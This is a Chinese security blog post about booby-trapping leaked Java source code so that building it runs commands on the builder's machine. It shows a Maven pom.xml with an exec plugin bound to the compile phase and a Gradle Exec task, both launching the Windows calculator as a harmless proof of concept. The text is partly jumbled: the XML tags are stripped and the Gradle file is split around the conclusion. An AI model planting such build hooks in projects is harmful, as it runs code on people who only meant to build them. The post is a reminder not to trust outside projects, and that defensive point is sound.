author：pen4uin 
time：2021/11/13
别想用我源码：针对源码泄露的反制思路(仅供娱乐)
目录
0x01 起
0x02 承
0x03 转
Maven
Gradle
0x04 合
0x01 起
自从看了@DriverTom师傅写的这篇文章后，
给我带来的感受就是，关于攻防演练的“潜规则”就只剩下
0x02 承
之前在fofa的帮助“捡到”了几套源码
同时，也从github从git clone了很多工具的源码(java)进行review 学习，但是在IDEA初次打开的时候，
相信大家对下面这个弹窗不会陌生
我不知道你们的选择是什么，我之前都是毫不在意地Trust Project，然后使用maven打包运行。
但是针对这个小细节，不由心生疑惑：“这个潜意识的操作有被反制的可能吗？”
0x03 转
这里只测试经常遇到了的两种Java项目构建工具，提供思路，其他的可自行测试。
Maven
测试如下：
源码
demo.java
pom.xml
public class demo {
public static void main(String[] args) {
  System.out.println("Hacked By Yourself ！");
}
}
4.0.0
org.example
rceDemo
1.0-SNAPSHOT
  7
  7
          org.codehaus.mojo
          exec-maven-plugin
          1.1.1
                  some-execution
                  compile
                      exec
              calc
弹计算器
Gradle
测试如下：
源码
build.gradle
plugins {
id 'java'
}
group 'org.example'
version '1.0-SNAPSHOT'
repositories {
mavenCentral()
}
dependencies {
settings.gradle
0x04 合
  其实关于漏洞产生的本质—“Untrusted Data From Outside”，不仅适用于各种网站、各种软件，也
同样适用于我们自己。
水这篇文章虽有供娱乐的目的，但同时也是给自己提个醒儿，以后在这些方面还是留意一下，别栽了”跟
头“！
  至于如何提升杀伤力真正达到反制的效果，我不会，我是废物。
testImplementation 'org.junit.jupiter:junit-jupiter-api:5.7.0'
testRuntimeOnly 'org.junit.jupiter:junit-jupiter-engine:5.7.0'
}
task demo(type: Exec){
commandLine 'cmd', '/c', 'calc'
}
rootProject.name = 'gradleRce'
参考
https://qastack.cn/programming/3491937/i-want-to-execute-shell-commands-from-mavens-
pom-xml
https://cloud.tencent.com/developer/ask/59734